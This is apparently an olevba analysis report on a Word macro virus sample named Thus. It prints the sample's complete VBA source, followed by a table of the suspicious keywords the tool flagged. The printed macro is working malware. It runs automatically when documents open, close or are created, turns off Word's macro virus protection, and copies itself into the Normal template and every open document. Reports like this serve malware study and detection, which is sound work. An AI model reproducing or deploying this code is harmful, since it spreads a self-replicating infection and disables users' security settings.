olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus.et-061bf95e1baf3cf9bcc94e1079c56d17063f02e9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus.et-061bf95e1baf3cf9bcc94e1079c56d17063f02e9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
'Thus_001'
'MacroKiller'

On Error Resume Next

    Dim objDoc As Document

    Application.Options.VirusProtection = False
    With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
        If .Lines(2, 1) = "'Thus_001'" And .Lines(3, 1) <> "'MacroKiller'" Then _
            .DeleteLines 1, .CountOfLines
        If .CountOfLines = 0 Then .InsertLines 1, _
            ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines _
            (1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
    End With
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    For Each objDoc In Application.Documents
        With objDoc.VBProject.VBComponents.Item(1).CodeModule
            If .Lines(2, 1) = "'Thus_001'" And .Lines(3, 1) <> "'MacroKiller'" Then _
                .DeleteLines 1, .CountOfLines
            If .CountOfLines = 0 Then .InsertLines 1, _
                ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines _
                (1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
        End With
    Next objDoc
    If Date > DateSerial(2002, 7, 5) Then
        With ThisDocument.VBProject.VBComponents.Item(1).CodeModule
            .DeleteLines 1, .CountOfLines
        End With
    End If
        
End Sub

Private Sub Document_Close()


    Document_Open
    
End Sub

Private Sub Document_New()

    Document_Open
    
End Sub



















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

